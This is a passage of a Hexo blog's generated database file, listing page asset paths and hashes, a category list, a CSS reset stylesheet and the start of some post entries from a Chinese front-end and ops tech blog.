System/UnixLike/Linux/持续进攻/index.html","hash":"0ac11e63511411542f4adcf37f26ce71d3f6c4b0","modified":1550814277825},{"_id":"public/2018/05/07/撩妹套路/index.html","hash":"33d3dc58f47ad70ccc7f1623a239756f9fbc7800","modified":1550814277825},{"_id":"public/2018/05/07/Algorithm/电梯调度算法/index.html","hash":"f177685a27f26ede9feb1dcc51e48f41f13788fa","modified":1550814277826},{"_id":"public/2018/05/05/FrontEnd/JS/怪异的JS/index.html","hash":"5b5eaa6be93a7d49ddca381dd465683440dd2d31","modified":1550814277826},{"_id":"public/2018/05/04/Operating System/UnixLike/Linux/添加自定义shell/index.html","hash":"4a5b563edf6feb25b8402030481ce2b6535d4230","modified":1550814277826},{"_id":"public/2018/05/04/GIT/git日常/index.html","hash":"809fd51c07228dad00cac804ed6382233977f059","modified":1550814277826},{"_id":"public/2018/05/04/Operating System/UnixLike/Linux/linux下docker部署gogs-git仓库/index.html","hash":"4080215cc0e6c6fee10554dc87908faceca05239","modified":1550814277826},{"_id":"public/2018/05/02/SQL/数据库范式介绍/index.html","hash":"82e430b7f78956a7898f7f3f45e2c2a5b2b75b17","modified":1550814277826},{"_id":"public/2018/04/28/GIT/git-操作规范/index.html","hash":"819b80cf80e8429cd1cf826d5b15b9e7287fe0b6","modified":1550814277826},{"_id":"public/2018/04/28/GIT/git使用指南/index.html","hash":"aca5b50786d3d16f57677af0b99101146c44199e","modified":1550814277826},{"_id":"public/2018/04/16/FrontEnd/JS/JS笔记-廖雪峰/index.html","hash":"a24ac0da69173cd01fd2b18aee674e2fdc37e5af","modified":1550814277827},{"_id":"public/2018/04/16/FrontEnd/JS/原生Ajax请求/index.html","hash":"7b6b12e65ac0a98610010272362a090176d774bd","modified":1550814277827},{"_id":"public/2018/04/16/SQL/NoSql/MongoDB/MongoDB-Node.js中的使用/index.html","hash":"b918fcba5fbfac4e161c22f0090cd9fb5f3dd39f","modified":1550814277827},{"_id":"public/2017/09/14/FrontEnd/WebFrameWork/React/React-02/index.html","hash":"024aa00b4eaea3f50dc2fc2e9661447aa3ed9b47","modified":1550814277827},{"_id":"public/2017/09/13/FrontEnd/WebFrameWork/React/React-01/index.html","hash":"68c4539a47ee1b51e01bad1d3f636473068b272a","modified":1550814277827},{"_id":"public/2017/01/16/Editor/VSCode使用笔记/index.html","hash":"366ce985c0f310459f5bac1943df5b8e76fc4bae","modified":1550814277827},{"_id":"public/2015/05/01/日常随笔/index.html","hash":"86dcc8e6d2bc6aeb64c84d7dc9cfbcfea93dc31b","modified":1550814277827},{"_id":"public/archives/index.html","hash":"5a83d50b89c4c7b141e79757fb02650540593476","modified":1550814277827},{"_id":"public/archives/page/2/index.html","hash":"81840af66d2d61f1377732ddd7abbcc614a18566","modified":1550814277827},{"_id":"public/archives/page/3/index.html","hash":"3329d194e3c2a36880d5a8cf4370ba3f1b82ac39","modified":1550814277827},{"_id":"public/archives/page/4/index.html","hash":"cac89129b5c2c2fa6af0853add54c9ec1851e3f3","modified":1550814277827},{"_id":"public/archives/page/5/index.html","hash":"0b1fa10c75b815548a1a8026a5b3ff369b2ada82","modified":1550814277827},{"_id":"public/archives/2018/index.html","hash":"ef449cdfc6f136127f6068879480ddc6837dbaf8","modified":1550814277827},{"_id":"public/archives/2018/page/2/index.html","hash":"eb891c4d6fce3316cdb5414a2b0a8072ee1dac59","modified":1550814277828},{"_id":"public/archives/2018/page/3/index.html","hash":"72977a29d586027d257e0566926fd22e97e58b29","modified":1550814277828},{"_id":"public/archives/2018/page/4/index.html","hash":"5c07a2acdc51680acbe79ecf371e28e918d70385","modified":1550814277828},{"_id":"public/archives/2018/page/5/index.html","hash":"54aaec146fd493fb81baf9021417a50a5d4ac0b4","modified":1550814277828},{"_id":"public/archives/2018/04/index.html","hash":"68ee7041b32a02a9153008a0ea842bf4338cfd78","modified":1550814277828},{"_id":"public/archives/2018/05/index.html","hash":"f5a66f0dcca80f7c2df245c6e4bafd518d9482d2","modified":1550814277828},{"_id":"public/archives/2018/05/page/2/index.html","hash":"32013ccb2d37d6ccce871f549fcd9687812b8655","modified":1550814277828},{"_id":"public/archives/2018/06/index.html","hash":"4a02ed0db78a65b4b70afaa4a1d6d033ec79a0c9","modified":1550814277828},{"_id":"public/archives/2018/07/index.html","hash":"377e760aaaf28a0657df92fe6b6f68b00565a78f","modified":1550814277828},{"_id":"public/archives/2018/08/index.html","hash":"bce382339f8d34db22bb382603f2510d527a7a76","modified":1550814277828},{"_id":"public/categories/JS/index.html","hash":"ff6fd1f940a6fdd9c50ec6aeab4bc5db737b9f42","modified":1550814277828},{"_id":"public/categories/CSS/index.html","hash":"8e20894b9d068962840db2c69061380b8429c8e3","modified":1550814277828},{"_id":"public/index.html","hash":"62c1f1be4b6559aff55ab0ab94f8406eb501f75e","modified":1550814277828},{"_id":"public/page/2/index.html","hash":"31972b339ccc9f09126048c5c500fd10ca50a037","modified":1550814277829},{"_id":"public/page/3/index.html","hash":"ef16097276207053fd41cfeb49589f3566150594","modified":1550814277829},{"_id":"public/page/4/index.html","hash":"59f7697aee4ffe8e23a0277302680b20dc6404e5","modified":1550814277829},{"_id":"public/page/5/index.html","hash":"2135fd23d99d83f6cade8bbd018554a4fa33215a","modified":1550814277829},{"_id":"public/page/6/index.html","hash":"569bfce10e2bf9643c3867d47ec67b4faa150569","modified":1550814277829},{"_id":"public/page/7/index.html","hash":"fb553ac3316d30f12d58e75dcffc6ce74aa5c520","modified":1550814277829},{"_id":"public/page/8/index.html","hash":"19ae6adfdbf85bf0d74afc94133460a4417e2397","modified":1550814277829},{"_id":"public/page/9/index.html","hash":"2d15c984c5ecc5ac99b80381eb35a00de85fc639","modified":1550814277829},{"_id":"public/page/10/index.html","hash":"da2f9c21cef9236c2c60828df9fa82292e77eeb5","modified":1550814277829},{"_id":"public/page/11/index.html","hash":"f1944512544f30ecf0bf94e5208688c0c2fb9648","modified":1550814277829},{"_id":"public/page/12/index.html","hash":"368546ea26fca9f4b590d179f85760aedecb5810","modified":1550814277830},{"_id":"public/page/13/index.html","hash":"de4e578dd7a01fc83de063fb573d9b62dd73ec42","modified":1550814277830},{"_id":"public/page/14/index.html","hash":"9595deca25826682efbcb53903e154191f103dd3","modified":1550814277830},{"_id":"public/page/15/index.html","hash":"da2f89bbfcbc5e9ba02e1762f90e4393ff256d66","modified":1550814277830},{"_id":"public/page/16/index.html","hash":"80149048fb7820e12010cec4bedd6a6ee84a419c","modified":1550814277830},{"_id":"public/page/17/index.html","hash":"8f7309065213666df8ffcaa4f4a323d746ffa994","modified":1550814277830},{"_id":"public/page/18/index.html","hash":"543c4c83286fe61dce6e13eb32622914abfdf82a","modified":1550814277830},{"_id":"public/page/19/index.html","hash":"234f5bc7842638d7f89b2784c5bb0a3914a8959a","modified":1550814277830},{"_id":"public/page/20/index.html","hash":"cb2ea60ac3a04a481d0aafb815b1d7f6246fc94f","modified":1550814277830},{"_id":"public/page/21/index.html","hash":"bcaedc927dc51b47b69d8fd4a9a1f97cd9dc0af5","modified":1550814277831},{"_id":"public/page/22/index.html","hash":"2adb99d5491f28fad167a331e072b863bb53441e","modified":1550814277831},{"_id":"public/page/23/index.html","hash":"02d0a00e1e66c67472ede0f23d877411e8100bcf","modified":1550814277831},{"_id":"public/page/24/index.html","hash":"88d0b3bab8d6c85608c04412cbcfb3ff4b52376a","modified":1550814277831},{"_id":"public/page/25/index.html","hash":"7ad9b7d947241d0d9e7ed7dc95a7703542b04087","modified":1550814277831},{"_id":"public/page/26/index.html","hash":"1a89b6978e0cd85801baa673981bd2342b8915e8","modified":1550814277831},{"_id":"public/page/27/index.html","hash":"4d590281d849bb63b0abc69ff59deb4d38b9ef65","modified":1550814277831},{"_id":"public/page/28/index.html","hash":"da6f7b3d5c2a1f7f3555ce22b444f9219d985dfc","modified":1550814277831},{"_id":"public/page/29/index.html","hash":"e258dfb57f59afa8277de17c50419a9fd6c53fe4","modified":1550814277831},{"_id":"public/2019/01/26/FrontEnd/HTML CSS/C3-选择器/index.html","hash":"d6a77ffa7972ee10a72c18776f081731c91c7699","modified":1550814277858},{"_id":"public/2019/01/18/FrontEnd/HTML CSS/CSS-文字超出隐藏/index.html","hash":"4d85519e0b91ea7666029a47dee9b6cbe5ff5e35","modified":1550814277858},{"_id":"public/2019/01/07/FrontEnd/HTML CSS/CSS-动态计算/index.html","hash":"d8a0fecf7fd615dcfc351796c67aa426f873dd7a","modified":1550814277858},{"_id":"public/archives/page/6/index.html","hash":"7339aca2e3f82c24fcae3c8aa17f46bc6f3b6537","modified":1550814277858},{"_id":"public/categories/Effects/index.html","hash":"a98621da68953cf317156214770b5ad17b08c8a9","modified":1550814277858},{"_id":"public/tags/线性过渡-渐变色/index.html","hash":"8e87caa16b58db1c8f92058c910c99834f494aae","modified":1550814277858},{"_id":"public/tags/IFrame/index.html","hash":"c6354f7d03e62e3a6d9dc4a236b4031d82a4d148","modified":1550814277858},{"_id":"public/tags/BSD部署/index.html","hash":"cd9bde671d469923102a9a113d21cc9ac686279a","modified":1550814277858},{"_id":"public/2019/01/02/FrontEnd/JS/IFrame/js之iframe父子页面通信/index.html","hash":"c89fa41485a7b2e9f49ada50c8f73aebbf43685a","modified":1550814277858},{"_id":"public/2018/12/18/FrontEnd/JS特效实现/react-无缝滚动动画/index.html","hash":"0915e15d821265dd60da7d51a2dd8af3d14da8cb","modified":1550814277858},{"_id":"public/2018/05/24/FrontEnd/JS特效实现/面向对象-手写手风琴特效/index.html","hash":"79c44977e44c3eeba339686dc548cbd235bb22f1","modified":1550814277859},{"_id":"public/page/30/index.html","hash":"17575e0a356fc65a405e55f480c5ce9661350f77","modified":1550814277859},{"_id":"public/page/31/index.html","hash":"b6f00614b0a9a306d415dc5995ee75e21db1532d","modified":1550814277859},{"_id":"public/assets/sampleCode/jingdianyixian.conf","hash":"bfca861e8eeb4879386d39ea1115904b1d9e7511","modified":1550814277864},{"_id":"public/assets/sampleCode/nginx.conf","hash":"c14562ca67f83bc521a29974b803a6002df8c98f","modified":1550814277864},{"_id":"public/css/fonts/FontAwesome.otf","hash":"b5b4f9be85f91f10799e87a083da1d050f842734","modified":1550814277864},{"_id":"public/css/fonts/fontawesome-webfont.eot","hash":"7619748fe34c64fb157a57f6d4ef3678f63a8f5e","modified":1550814277864},{"_id":"public/css/fonts/fontawesome-webfont.woff","hash":"04c3bf56d87a0828935bd6b4aee859995f321693","modified":1550814277864},{"_id":"public/css/images/icon.png","hash":"fee44135f55ced3dee76a1f9f879c73417b7bfef","modified":1550814277864},{"_id":"public/css/images/icon2.png","hash":"d9fe6b6ff83c93ef62a301202a041586a7c9c2ff","modified":1550814277864},{"_id":"public/plugin/fancybox/blank.gif","hash":"2daeaa8b5f19f0bc209d976c02bd6acb51b00b0a","modified":1550814277864},{"_id":"public/plugin/fancybox/fancybox_loading.gif","hash":"1a755fb2599f3a313cc6cfdb14df043f8c14a99c","modified":1550814277864},{"_id":"public/plugin/fancybox/fancybox_loading@2x.gif","hash":"273b123496a42ba45c3416adb027cd99745058b0","modified":1550814277864},{"_id":"public/plugin/fancybox/fancybox_overlay.png","hash":"b3a4ee645ba494f52840ef8412015ba0f465dbe0","modified":1550814277864},{"_id":"public/plugin/fancybox/fancybox_sprite.png","hash":"17df19f97628e77be09c352bf27425faea248251","modified":1550814277865},{"_id":"public/plugin/fancybox/fancybox_sprite@2x.png","hash":"30c58913f327e28f466a00f4c1ac8001b560aed8","modified":1550814277865},{"_id":"public/plugin/fancybox/helpers/fancybox_buttons.png","hash":"e385b139516c6813dcd64b8fc431c364ceafe5f3","modified":1550814277865},{"_id":"public/css/fonts/fontawesome-webfont.ttf","hash":"7f09c97f333917034ad08fa7295e916c9f72fd3f","modified":1550814279618},{"_id":"public/plugin/galmenu/img.png","hash":"05f69ea7da06bc228eac4d2ef80d0c8d2131bd05","modified":1550814279619},{"_id":"public/plugin/galmenu/wulusai.mp3","hash":"34e7bc2cf591f7b38a2c709a8c9fd84bdf197a59","modified":1550814279620},{"_id":"public/js/script.js","hash":"2876e0b19ce557fca38d7c6f49ca55922ab666a1","modified":1550814279756},{"_id":"public/css/plugin/hover.css","hash":"54ec3d2774906f08e711ac0e494dccd09aefd570","modified":1550814279756},{"_id":"public/css/plugin/animate.css","hash":"7a1f3de057c416bd10edc288c7e8ac0b645232ab","modified":1550814279756},{"_id":"public/plugin/bganimation/bg.css","hash":"ecb949d2dd3d458c80772b255f93dab3e6a80783","modified":1550814279756},{"_id":"public/plugin/fancybox/jquery.fancybox.css","hash":"aaa582fb9eb4b7092dc69fcb2d5b1c20cca58ab6","modified":1550814279756},{"_id":"public/plugin/galmenu/GalMenu.css","hash":"ae1357f888f3389bc4b39bde62d68533caefb6b5","modified":1550814279756},{"_id":"public/plugin/galmenu/GalMenu.js","hash":"8549620fcb0b6a9bb329b799906aba6fb41c61f0","modified":1550814279756},{"_id":"public/plugin/fancybox/helpers/jquery.fancybox-buttons.css","hash":"1a9d8e5c22b371fcc69d4dbbb823d9c39f04c0c8","modified":1550814279757},{"_id":"public/plugin/fancybox/helpers/jquery.fancybox-buttons.js","hash":"dc3645529a4bf72983a39fa34c1eb9146e082019","modified":1550814279757},{"_id":"public/plugin/fancybox/helpers/jquery.fancybox-media.js","hash":"294420f9ff20f4e3584d212b0c262a00a96ecdb3","modified":1550814279757},{"_id":"public/plugin/fancybox/helpers/jquery.fancybox-thumbs.css","hash":"4ac329c16a5277592fc12a37cca3d72ca4ec292f","modified":1550814279757},{"_id":"public/plugin/fancybox/helpers/jquery.fancybox-thumbs.js","hash":"47da1ae5401c24b5c17cc18e2730780f5c1a7a0c","modified":1550814279757},{"_id":"public/css/style.css","hash":"4325f7050907bd0f20f55a03cf1bf10a71730d3a","modified":1550814279757},{"_id":"public/css/fontawesome/font-awesome-ie7.css","hash":"e142f6748ea95bff17ba450ed071a17b066642c7","modified":1550814279757},{"_id":"public/css/fontawesome/font-awesome-ie7.min.css","hash":"d66b7374b5dd6259dfd5c4eb682925305f6716d4","modified":1550814279757},{"_id":"public/css/fontawesome/font-awesome.css","hash":"57ca25a18cbdedf36973b712bc81f9e3f883a371","modified":1550814279757},{"_id":"public/css/fontawesome/font-awesome.min.css","hash":"68e2602c02181b61eebc9e1dccb0a38377fa5df7","modified":1550814279757},{"_id":"public/plugin/fancybox/jquery.fancybox.js","hash":"d08b03a42d5c4ba456ef8ba33116fdbb7a9cabed","modified":1550814279757},{"_id":"public/plugin/fancybox/jquery.fancybox.pack.js","hash":"9e0d51ca1dbe66f6c0c7aefd552dc8122e694a6e","modified":1550814279757},{"_id":"public/assets/img/AliCloud-SSL证书认证.jpg","hash":"9bcabd88b0be44e8947deced5d8d08456d56c276","modified":1550814279757},{"_id":"public/assets/img/FrontEnd.jpg","hash":"8504d0ccdebcac458738c3115950a6c3e773cd1d","modified":1550814279956},{"_id":"public/css/fonts/fontawesome-webfont.svg","hash":"a275426daefd3716c53561fad121d258a7f05b47","modified":1550814279956},{"_id":"public/css/images/banne1r.jpg","hash":"f44aa591089fcb3ec79770a1e102fd3289a7c6a6","modified":1550814279957},{"_id":"public/css/images/banner.jpg","hash":"532bf5150abc6aedb871c8b05e5c8dacd4111f32","modified":1550814279957},{"_id":"public/assets/img/FreeBSD Quickstart Guide For Linux Users.jpg","hash":"02616929cec505a27168da031f834b97d7bedfa8","modified":1550814280036}],"Category":[{"name":"Canvas","_id":"cjsfmrxqs0004zodvc5wxmsco"},{"name":"HTTP","_id":"cjsfmrxr80009zodv4xv5s1o1"},{"name":"JS","_id":"cjsfmrxrd000fzodv2ii2tyy0"},{"name":"二手房","_id":"cjsfmrxrh000lzodvhrng8qyn"},{"name":"计算机技术原理","_id":"cjsfmrxrm000szodv7lnow249"},{"name":"CSS","_id":"cjsfmrxrq000yzodvdvllgl4k"},{"name":"日常随笔","_id":"cjsfmrxrt0014zodvqsu5erny"},{"name":"感情","_id":"cjsfmrxs0001azodvvgo9ick4"},{"name":"Change the world","_id":"cjsfmrxs7001hzodvap45tf5m"},{"name":"知识点","_id":"cjsfmrxsa001lzodv0gral1ae"},{"name":"日常记录","_id":"cjsfmrxsd001pzodvh565p7t9"},{"name":"日记","_id":"cjsfmrxsg001tzodvuf1z9pn2"},{"name":"知乎","_id":"cjsfmrxsk001xzodvq9gosvc4"},{"name":"Node","_id":"cjsfmrxsm0021zodviewlb3s9"},{"name":"文学技能","_id":"cjsfmrxsp0025zodvomehh6lp"},{"name":"Algorithm","_id":"cjsfmrxug002czodv72pxj7h7"},{"name":"算法","_id":"cjsfmrxux002uzodvfiywnwih"},{"name":"VSCode","_id":"cjsfmrxv30031zodvb09rie4j"},{"name":"edit","_id":"cjsfmrxvi003hzodvc4fxs63e"},{"name":"Electron","_id":"cjsfmrxvm003ozodv1812l7cr"},{"name":"ECharts","_id":"cjsfmrxvq003vzodve7n8kx9l"},{"name":"Tinymce","_id":"cjsfmrxvu0041zodvyut61w6o"},{"name":"WebPack","_id":"cjsfmrxvz0047zodvpit8tfwv"},{"name":"Browser","_id":"cjsfmrxwa004dzodvgp8v6j6s"},{"name":"js-window","_id":"cjsfmrxwe004lzodvj2jt0tqq"},{"name":"Node-multiparty","_id":"cjsfmrxwi004rzodvre4iuo64"},{"name":"Upload","_id":"cjsfmrxwm004xzodvyk45qj63"},{"name":"git","_id":"cjsfmrxwq0053zodvjvoc5cuw"},{"name":"Git","_id":"cjsfmrxwu005azodvfbwqjjxx"},{"name":"axios","_id":"cjsfmrxx6005yzodvbg5cxcli"},{"name":"Cookie HTTP","_id":"cjsfmrxx80063zodvwk7brtci"},{"name":"数据库","_id":"cjsfmrxx90067zodvpo61hzsi"},{"name":"SVN","_id":"cjsfmrxxa006bzodv5f954q6q"},{"name":"TS","_id":"cjsfmrxxb006fzodv5fg2h5ku"},{"name":"WxApp","_id":"cjsfmrxxd006jzodvrh2tiupm"},{"name":"ProgrammingLang","_id":"cjsfmrxxe006nzodvpy5zqmqs"},{"name":"SSL","_id":"cjsfmrxxf006rzodv6u9ddzjt"},{"name":"Docker","_id":"cjsfmrxxg006vzodvnip30z13"},{"name":"Nginx","_id":"cjsfmrxxi006zzodvr1r7ohm9"},{"name":"Server","_id":"cjsfmrxxj0073zodv8kov6fu1"},{"name":"Date","_id":"cjsfmrxxl007azodvfhfsichy"},{"name":"HTML+CSS","_id":"cjsfmrxyj0083zodvw1wgddjq"},{"name":"HTML","_id":"cjsfmrxz0008nzodvkf3mlxu9"},{"name":"HTML CSS","_id":"cjsfmrxz5008vzodvcvyvmm3e"},{"name":"JSON","_id":"cjsfmrxzc0092zodvs40sj8fw"},{"name":"JavaScript","_id":"cjsfmrxzh0099zodvyhz8xeky"},{"name":"JS修改CSS","_id":"cjsfmrxzl009fzodvyl9j3ry8"},{"name":"原生JS","_id":"cjsfmrxzr009ozodvqn4pjfho"},{"name":"JS RunTime","_id":"cjsfmrxzu009vzodvrxy7i5sa"},{"name":"JSApi","_id":"cjsfmrxzy00a2zodvy8or3fzz"},{"name":"JS-console","_id":"cjsfmry0100a8zodvxkd572ym"},{"name":"前端路由","_id":"cjsfmry0500ahzodvb7jypcty"},{"name":"Ajax","_id":"cjsfmry0800aozodvv0hm5ko4"},{"name":"JS-DOM","_id":"cjsfmry0c00avzodv82afh1mi"},{"name":"Effects","_id":"cjsfmry0h00b2zodvnvtng039"},{"name":"VUE","_id":"cjsfmry0n00bazodvdoze41wf"},{"name":"Component-design","_id":"cjsfmry0q00bgzodv7qzuwwh2"},{"name":"Windows","_id":"cjsfmry0t00bnzodvxvfdru2c"},{"name":"Node Express-session","_id":"cjsfmry0y00buzodvqo1i71qw"},{"name":"Node FS","_id":"cjsfmry1100c1zodvuur8f5dr"},{"name":"Set-Cookie","_id":"cjsfmry1200c6zodv0cmj1k5s"},{"name":"Python","_id":"cjsfmry1300cazodvab6gbkge"},{"name":"前端","_id":"cjsfmry2600dozodvyi4yjfc2"},{"name":"React","_id":"cjsfmry2a00dvzodvoia0uohv"},{"name":"Redux","_id":"cjsfmry2h00e5zodvc94o9h8z"},{"name":"TSX-VUE-Watch","_id":"cjsfmry2m00edzodvvvnz4yrp"},{"name":"react","_id":"cjsfmry2q00ekzodvi38mgx57"},{"name":"Vtsx","_id":"cjsfmry2u00eszodvx7mlg86x"},{"name":"Vue","_id":"cjsfmry2z00ezzodv6idjhmat"},{"name":"Vue-Watch","_id":"cjsfmry3400f6zodvvpxx78oy"},{"name":"Linux","_id":"cjsfmry3c00fhzodvz1fljk8r"},{"name":"UnixLike","_id":"cjsfmry3q00g1zodvgaj83m2y"},{"name":"shell","_id":"cjsfmry3x00g9zodvnwqncp35"},{"name":"SSH","_id":"cjsfmry4000gfzodv765dj5xw"},{"name":"Docker-mongo","_id":"cjsfmry4100gjzodv73yhpvrc"},{"name":"MongoDB","_id":"cjsfmry4300gnzodvm8rgms8a"},{"name":"NPM","_id":"cjsfmry4400grzodvveajv8r7"},{"name":"npm","_id":"cjsfmry4600gxzodv0kl3od1r"},{"name":"FreeBSD","_id":"cjsfmry4h00hnzodv3zqdyc89"}],"Data":[],"Page":[{"title":"categories","layout":"categories","_content":"","source":"categories/index.md","raw":"title: \"categories\"\nlayout: \"categories\"\n---\n","date":"2018-09-05T06:33:18.555Z","updated":"2018-09-05T06:33:18.555Z","path":"categories/index.html","comments":1,"_id":"cjsfmrxqi0000zodvjuuf0zep","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"Tags","layout":"tags","_content":"","source":"tags/index.md","raw":"title: \"Tags\"\nlayout: \"tags\"\n---","date":"2018-09-05T06:33:18.555Z","updated":"2018-09-05T06:33:18.555Z","path":"tags/index.html","comments":1,"_id":"cjsfmrxqo0002zodv38bvas8t","content":"","site":{"data":{}},"excerpt":"","more":""},{"_content":"/* http://meyerweb.com/eric/tools/css/reset/ \n   v2.0 | 20110126\n   License: none (public domain)\n*/\n\nhtml,\nbody,\ndiv,\nspan,\napplet,\nobject,\niframe,\nh1,\nh2,\nh3,\nh4,\nh5,\nh6,\np,\nblockquote,\npre,\na,\nabbr,\nacronym,\naddress,\nbig,\ncite,\ncode,\ndel,\ndfn,\nem,\nimg,\nins,\nkbd,\nq,\ns,\nsamp,\nsmall,\nstrike,\nstrong,\nsub,\nsup,\ntt,\nvar,\nb,\nu,\ni,\ncenter,\ndl,\ndt,\ndd,\nol,\nul,\nli,\nfieldset,\nform,\nlabel,\nlegend,\ntable,\ncaption,\ntbody,\ntfoot,\nthead,\ntr,\nth,\ntd,\narticle,\naside,\ncanvas,\ndetails,\nembed,\nfigure,\nfigcaption,\nfooter,\nheader,\nhgroup,\nmenu,\nnav,\noutput,\nruby,\nsection,\nsummary,\ntime,\nmark,\naudio,\nvideo {\n    margin: 0;\n    padding: 0;\n    border: 0;\n    font-size: 100%;\n    font: inherit;\n    vertical-align: baseline;\n}\n\n\n/* HTML5 display-role reset for older browsers */\n\narticle,\naside,\ndetails,\nfigcaption,\nfigure,\nfooter,\nheader,\nhgroup,\nmenu,\nnav,\nsection {\n    display: block;\n}\n\nbody {\n    line-height: 1;\n}\n\nol,\nul {\n    list-style: none;\n}\n\nblockquote,\nq {\n    quotes: none;\n}\n\nblockquote:before,\nblockquote:after,\nq:before,\nq:after {\n    content: '';\n    content: none;\n}\n\ntable {\n    border-collapse: collapse;\n    border-spacing: 0;\n}","source":"assets/sampleCode/reset.css","raw":"/* http://meyerweb.com/eric/tools/css/reset/ \n   v2.0 | 20110126\n   License: none (public domain)\n*/\n\nhtml,\nbody,\ndiv,\nspan,\napplet,\nobject,\niframe,\nh1,\nh2,\nh3,\nh4,\nh5,\nh6,\np,\nblockquote,\npre,\na,\nabbr,\nacronym,\naddress,\nbig,\ncite,\ncode,\ndel,\ndfn,\nem,\nimg,\nins,\nkbd,\nq,\ns,\nsamp,\nsmall,\nstrike,\nstrong,\nsub,\nsup,\ntt,\nvar,\nb,\nu,\ni,\ncenter,\ndl,\ndt,\ndd,\nol,\nul,\nli,\nfieldset,\nform,\nlabel,\nlegend,\ntable,\ncaption,\ntbody,\ntfoot,\nthead,\ntr,\nth,\ntd,\narticle,\naside,\ncanvas,\ndetails,\nembed,\nfigure,\nfigcaption,\nfooter,\nheader,\nhgroup,\nmenu,\nnav,\noutput,\nruby,\nsection,\nsummary,\ntime,\nmark,\naudio,\nvideo {\n    margin: 0;\n    padding: 0;\n    border: 0;\n    font-size: 100%;\n    font: inherit;\n    vertical-align: baseline;\n}\n\n\n/* HTML5 display-role reset for older browsers */\n\narticle,\naside,\ndetails,\nfigcaption,\nfigure,\nfooter,\nheader,\nhgroup,\nmenu,\nnav,\nsection {\n    display: block;\n}\n\nbody {\n    line-height: 1;\n}\n\nol,\nul {\n    list-style: none;\n}\n\nblockquote,\nq {\n    quotes: none;\n}\n\nblockquote:before,\nblockquote:after,\nq:before,\nq:after {\n    content: '';\n    content: none;\n}\n\ntable {\n    border-collapse: collapse;\n    border-spacing: 0;\n}","date":"2018-09-05T06:33:18.544Z","updated":"2018-09-05T06:33:18.544Z","path":"assets/sampleCode/reset.css","layout":"false","title":"","comments":1,"_id":"cjsfmrxuc0029zodvb9nv7t40","content":"/* http://meyerweb.com/eric/tools/css/reset/ \n   v2.0 | 20110126\n   License: none (public domain)\n*/\n\nhtml,\nbody,\ndiv,\nspan,\napplet,\nobject,\niframe,\nh1,\nh2,\nh3,\nh4,\nh5,\nh6,\np,\nblockquote,\npre,\na,\nabbr,\nacronym,\naddress,\nbig,\ncite,\ncode,\ndel,\ndfn,\nem,\nimg,\nins,\nkbd,\nq,\ns,\nsamp,\nsmall,\nstrike,\nstrong,\nsub,\nsup,\ntt,\nvar,\nb,\nu,\ni,\ncenter,\ndl,\ndt,\ndd,\nol,\nul,\nli,\nfieldset,\nform,\nlabel,\nlegend,\ntable,\ncaption,\ntbody,\ntfoot,\nthead,\ntr,\nth,\ntd,\narticle,\naside,\ncanvas,\ndetails,\nembed,\nfigure,\nfigcaption,\nfooter,\nheader,\nhgroup,\nmenu,\nnav,\noutput,\nruby,\nsection,\nsummary,\ntime,\nmark,\naudio,\nvideo {\n    margin: 0;\n    padding: 0;\n    border: 0;\n    font-size: 100%;\n    font: inherit;\n    vertical-align: baseline;\n}\n\n\n/* HTML5 display-role reset for older browsers */\n\narticle,\naside,\ndetails,\nfigcaption,\nfigure,\nfooter,\nheader,\nhgroup,\nmenu,\nnav,\nsection {\n    display: block;\n}\n\nbody {\n    line-height: 1;\n}\n\nol,\nul {\n    list-style: none;\n}\n\nblockquote,\nq {\n    quotes: none;\n}\n\nblockquote:before,\nblockquote:after,\nq:before,\nq:after {\n    content: '';\n    content: none;\n}\n\ntable {\n    border-collapse: collapse;\n    border-spacing: 0;\n}","site":{"data":{}},"excerpt":"","more":"/* http://meyerweb.com/eric/tools/css/reset/ \n   v2.0 | 20110126\n   License: none (public domain)\n*/\n\nhtml,\nbody,\ndiv,\nspan,\napplet,\nobject,\niframe,\nh1,\nh2,\nh3,\nh4,\nh5,\nh6,\np,\nblockquote,\npre,\na,\nabbr,\nacronym,\naddress,\nbig,\ncite,\ncode,\ndel,\ndfn,\nem,\nimg,\nins,\nkbd,\nq,\ns,\nsamp,\nsmall,\nstrike,\nstrong,\nsub,\nsup,\ntt,\nvar,\nb,\nu,\ni,\ncenter,\ndl,\ndt,\ndd,\nol,\nul,\nli,\nfieldset,\nform,\nlabel,\nlegend,\ntable,\ncaption,\ntbody,\ntfoot,\nthead,\ntr,\nth,\ntd,\narticle,\naside,\ncanvas,\ndetails,\nembed,\nfigure,\nfigcaption,\nfooter,\nheader,\nhgroup,\nmenu,\nnav,\noutput,\nruby,\nsection,\nsummary,\ntime,\nmark,\naudio,\nvideo {\n    margin: 0;\n    padding: 0;\n    border: 0;\n    font-size: 100%;\n    font: inherit;\n    vertical-align: baseline;\n}\n\n\n/* HTML5 display-role reset for older browsers */\n\narticle,\naside,\ndetails,\nfigcaption,\nfigure,\nfooter,\nheader,\nhgroup,\nmenu,\nnav,\nsection {\n    display: block;\n}\n\nbody {\n    line-height: 1;\n}\n\nol,\nul {\n    list-style: none;\n}\n\nblockquote,\nq {\n    quotes: none;\n}\n\nblockquote:before,\nblockquote:after,\nq:before,\nq:after {\n    content: '';\n    content: none;\n}\n\ntable {\n    border-collapse: collapse;\n    border-spacing: 0;\n}"}],"Post":[{"title":"Canvas在线签名","date":"2018-07-07T01:51:07.000Z","_content":"## Canvas在线签名\n\n---\n[阅读原文](https://jdc.jd.com/archives/212515)","source":"_posts/Canvas在线签名.md","raw":"---\ntitle: Canvas在线签名\ndate: 2018-07-07 09:51:07\ntags: 在线签名\ncategories: Canvas\n---\n## Canvas在线签名\n\n---\n[阅读原文](https://jdc.jd.com/archives/212515)","slug":"Canvas在线签名","published":1,"updated":"2018-09-05T06:33:18.441Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxqk0001zodveot1rkur","content":"<h2 id=\"Canvas在线签名\"><a href=\"#Canvas在线签名\" class=\"headerlink\" title=\"Canvas在线签名\"></a>Canvas在线签名</h2><hr>\n<p><a href=\"https://jdc.jd.com/archives/212515\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Canvas在线签名\"><a href=\"#Canvas在线签名\" class=\"headerlink\" title=\"Canvas在线签名\"></a>Canvas在线签名</h2><hr>\n<p><a href=\"https://jdc.jd.com/archives/212515\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n"},{"title":"SPDY：Google开发的下一代HTTP协议","date":"2018-05-03T06:46:47.000Z","archives":"HTTP协议","_content":"# 